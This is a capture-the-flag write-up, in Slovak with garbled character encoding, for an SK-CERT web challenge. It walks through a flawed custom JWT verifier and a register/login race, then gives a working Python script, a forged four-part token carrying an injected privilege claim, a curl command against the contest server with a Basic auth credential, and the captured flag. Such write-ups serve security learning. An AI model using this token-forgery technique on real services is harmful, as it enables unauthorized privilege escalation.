# Zadanie

EN: There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?

SK: Zd√° sa, ≈æe existuje koncov√Ω bod, ku ktor√©mu m√° pr√≠stup iba privilegovan√Ω pou≈æ√≠vateƒæ. Dok√°≈æe≈° n√°js≈• sp√¥sob, ako sa k nemu dosta≈•?

## Rie≈°enie

Z index,js je zrejm√©, ≈æe p√¥jde zrejme o api endpoint /api/secret-note, ktor√Ω n√°m vr√°ti env premenn√∫ a tu u≈æ sa pou≈æ√≠va auth middleware, kde potrebujem validn√Ω token v ktorom je `"is_d4rk_pr1nc3ss":True`, ale keƒè sa pozrieme bli≈æ≈°ie na login endpoint, tak pri √∫spe≈°nom logine a n√°m po≈°le aj cookies s tokenom, ktor√Ω sa n√°m zrejme z√≠de.

```javascript
app.post("/api/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const { rows } = await dbAsync.query(
      "SELECT id, username, verified FROM users WHERE username = $1 AND password = $2",
      [username, password]
    );

    if (rows.length === 0) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const user = rows[0];
    if (!user.verified) {
      return res
        .status(401)
        .json({ error: "The Dark Council has not approved you yet" });
    }

    const token = createToken({
      id: user.id,
      username: user.username,
    });

    res.cookie("token", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
    });

    return res.json({
      success: true,
      welcome_msg: process.env.LOGIN_WELCOME_MESSAGE,
    });
  } catch (err) {
    return res.status(500).json({ error: "Login failed" });
  }
});

function authMiddleware(req, res, next) {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: "No token provided" });

  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ error: "Invalid token" });
  }

  req.user = payload;
  next();
}

app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) {
    return res.send(process.env.DARK_PRINCESS_SECRET);
  }
  return res.send("You are not the Dark Princess");
});
```

Uprav√≠me teda skript z predo≈°lej √∫lohy, aby sme do v√Ωstupu vyp√≠sali aj hlaviƒçky.

```python
import httpx
import asyncio
from datetime import datetime

def log(msg):
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}] {msg}")

headers = {
    "Authorization": "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9",
    "Content-Type": "application/json"
}

data_register = {
    "username": "pony",
    "password": "pony",
    "email": "pony@pony.pony"
}

data_login = {
    "username": "pony",
    "password": "pony"
}

def print_response(resp, label):
    log(f"‚úÖ [{label}] {resp.status_code}")
    print(resp.text)
    print(f"üì® [{label}] Headers:")
    for k, v in resp.headers.items():
        print(f"  {k}: {v}")
    log(f"‚úÖ [{label}] Hotovo\n")

async def send_register(client):
    log("‚û°Ô∏è  [REGISTER] Posielam POST /register")
    resp = await client.post("http://exp.cybergame.sk:7000/secretbackend/api/register",
                             json=data_register, headers=headers)
    print_response(resp, "REGISTER")

async def send_login(client, delay=0.3):
    await asyncio.sleep(delay)
    log(f"‚û°Ô∏è  [LOGIN] Posielam POST /login po {int(delay * 1000)} ms")
    resp = await client.post("http://exp.cybergame.sk:7000/secretbackend/api/login",
                             json=data_login, headers=headers)
    print_response(resp, "LOGIN")

async def main():
    async with httpx.AsyncClient() as client:
        await asyncio.gather(
            send_register(client),
            send_login(client, delay=0.3)
        )

asyncio.run(main())
```

A vr√°ti n√°m skutoƒçne aj:

```
set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImQ0YjQxNzViLTZhM2MtNDE0Mi05MzdmLTc5ZDIyNTEwMWJlYyIsInVzZXJuYW1lIjoicG9ueSJ9.JZ1haLrzEx0J3horEnL0j2B8JezL7pe9rrmbv3ShwW4%3D; Path=/; HttpOnly; SameSite=Strict
```

po dek√≥dovan√≠

```
{"alg":"HS256","typ":"JWT"}.{"id":"d4b4175b-6a3c-4142-937f-79d225101bec","username":"pony"}.PODPIS
```

ch√Ωba nam tam v≈°ak to `is_d4rk_pr1nc3ss`

Backend pou≈æ√≠va pre auth middleware script jwt.js, pozrieme sa bli≈æ≈°ie.

```javascript
const crypto = require("crypto");
const { v4 } = require("uuid");

const JWT_SECRET = v4();

function createToken(payload) {
  const base64Payload = Buffer.from(JSON.stringify(payload)).toString("base64");
  const signature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(base64Payload)
    .digest("base64");

  return `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${base64Payload}.${signature}`;
}

function verifyToken(token) {
  const parts = token.split(".");
  if (parts.length < 3) return null;

  const payload = parts[1];
  const signature = parts[parts.length - 1];

  const expectedSignature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(parts[parts.length - 2])
    .digest("base64");

  if (signature === expectedSignature) {
    return JSON.parse(Buffer.from(payload, "base64").toString());
  }
  return null;
}

module.exports = {
  createToken,
  verifyToken,
};
```

Zauj√≠mav√° je funkcia verifyToken, ktor√° overuje, ƒçi token nem√° menej ƒçast√≠ ako 3, ako payload akceptuje druh√∫ ƒças≈• zƒæava `payload = parts[1]` a ako podpis `signature = parts[parts.length - 1]` vezme posledn√∫ hodnotu (parts.lenght vr√°ti ƒç√≠slo, ale index je od nuly, preto -1), ale u≈æ to zav√°≈àa t√Ωm, ≈æe m√¥≈æeme posla≈• token z viac ako tromi ƒças≈•ami.

```javascript
const expectedSignature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(parts[parts.length - 2])
    .digest("base64");
```

A t√°to ƒças≈• to dokazuje..  verify token, vezme druh√∫ ƒças≈• ako payload, posledn√∫ ƒças≈• ako podpis a ten podpis overuje, ƒçi je platn√Ω pre predposledn√∫ ƒças≈• a nie t√∫ druh√∫.. Tak≈æe keƒè po≈°lem ten ist√Ω token ƒço som dostal, ale medzi hlaviƒçku a origin√°lny payload vlo≈æ√≠m m√¥j, malo by to prejs≈•..

Tak≈æe n√°≈° token by mal vyzera≈•  takto

`HEADER.EVIL_PALOAD.AKYKOLVEK_PAYLOAD_KU_KTOREMU_POZNAME_PLATNY_PODPIS.TEN_PLATNY_PODPIS`

`H.EVIL_P.P.S`

EVIL_P bude `{"is_d4rk_pr1nc3ss":true}` do base_64 `eyJpc19kNHJrX3ByMW5jM3NzIjp0cnVlfQ`

Nas forgenuty jwt

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19kNHJrX3ByMW5jM3NzIjp0cnVlfQ.eyJpZCI6ImQ0YjQxNzViLTZhM2MtNDE0Mi05MzdmLTc5ZDIyNTEwMWJlYyIsInVzZXJuYW1lIjoicG9ueSJ9.JZ1haLrzEx0J3horEnL0j2B8JezL7pe9rrmbv3ShwW4=
```

po≈°lem ako curl

```bash
curl -X GET "http://exp.cybergame.sk:7000/secretbackend/api/secret-note" -H "Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9" -H "Content-Type: application/json" --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19kNHJrX3ByMW5jM3NzIjp0cnVlfQ.eyJpZCI6ImQ0YjQxNzViLTZhM2MtNDE0Mi05MzdmLTc5ZDIyNTEwMWJlYyIsInVzZXJuYW1lIjoicG9ueSJ9.JZ1haLrzEx0J3horEnL0j2B8JezL7pe9rrmbv3ShwW4%3D"
```

Vr√°ti mi

> They fear the night, yet they do not understand its power. The fools bask in the daylight, blind to what lurks beyond the stars. But I see. I remember. And soon, they will too. The throne was never meant for the sun alone. The time will come. I must be patient. SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}

## Vlajka

```
SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y}
```
